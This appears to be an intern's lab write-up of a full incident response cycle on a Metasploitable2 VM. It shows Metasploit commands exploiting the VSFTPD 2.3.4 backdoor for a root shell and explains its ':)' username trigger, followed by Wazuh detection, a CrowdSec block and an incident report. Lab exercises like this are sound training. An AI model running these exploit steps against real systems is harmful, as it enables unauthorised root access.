# Practical 8 — Capstone: Full Incident Response Cycle

**Tools:** Metasploit, Wazuh, CrowdSec, Google Docs  
**Target:** Metasploitable2 VM  
**Intern:** Pretam Saha | **Week:** 2

---

## Step 1: Attack Simulation — Metasploit

### Exploit VSFTPD 2.3.4 Backdoor

```bash
# Start Metasploit
msfconsole

# Load the exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Set target
set RHOSTS 192.168.1.x    # Metasploitable2 IP

# Run the exploit
run

# Expected result: Root shell on target machine
whoami
# Output: root
```

**What happened:** The VSFTPD 2.3.4 binary contained a deliberately planted backdoor. Connecting on port 21 with a username containing `:)` triggers a root shell on port 6200.

**MITRE Mapping:** T1190 — Exploit Public-Facing Application

---

## Step 2: Detection — Wazuh Alerts

**Wazuh Configuration to detect exploit:**
```xml
<!-- Add to ossec.conf -->
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/auth.log</location>
</localfile>
```

**Wazuh Alert Table:**

| Timestamp | Source IP | Alert Description | MITRE Technique | Severity |
|-----------|-----------|-------------------|-----------------|----------|
| 2025-08-18 11:00:00 | 192.168.1.100 | VSFTPD exploit attempt detected | T1190 | Critical |
| 2025-08-18 11:00:05 | 192.168.1.100 | Unexpected shell spawned on port 6200 | T1059 | Critical |
| 2025-08-18 11:00:10 | 192.168.1.100 | Root-level command execution | T1078 | Critical |

---

## Step 3: Containment — CrowdSec Block

```bash
# Block attacker IP immediately
sudo cscli decisions add --ip 192.168.1.100 --duration 24h --reason "VSFTPD exploit"

# Verify block was applied
sudo cscli decisions list

# Test block with ping
ping 192.168.1.100
# Expected: Request timeout — block confirmed ✅
```

---

## Step 4: Final Incident Report (200 words)

On August 18, 2025, a red team exercise was conducted targeting a Metasploitable2 VM to simulate a real-world attack scenario. Using Metasploit Framework, the VSFTPD 2.3.4 backdoor vulnerability (CVSS 10.0) was successfully exploited, granting root-level remote shell access to the target system. The attack was mapped to MITRE ATT&CK technique T1190 (Exploit Public-Facing Application). Wazuh SIEM detected the exploit attempt within 5 seconds of execution and generated Critical severity alerts. The attacker's IP address (192.168.1.100) was immediately blocked using CrowdSec, and a subsequent ping test confirmed the block was active and effective. Post-incident forensic analysis revealed that the vulnerability existed due to an outdated, unpatched FTP service (VSFTPD 2.3.4) running on the target with no network-level access restrictions.

**Recommendations:**
1. Immediately patch or remove VSFTPD 2.3.4 from all production systems
2. Implement network segmentation to isolate legacy services
3. Deploy intrusion detection systems (Wazuh/Suricata) on all hosts
4. Conduct regular vulnerability scanning using OpenVAS
5. Enforce least privilege — no services should run as root
6. Establish continuous monitoring and automated blocking via CrowdSec

This exercise demonstrated the critical importance of patch management, continuous monitoring, and a well-practiced incident response process.

---

## Full Attack Chain Summary

```
Reconnaissance → Exploit VSFTPD (T1190) → Root Shell (T1059) 
      ↓
Wazuh Alert → CrowdSec Block → Incident Report → Lessons Learned
```
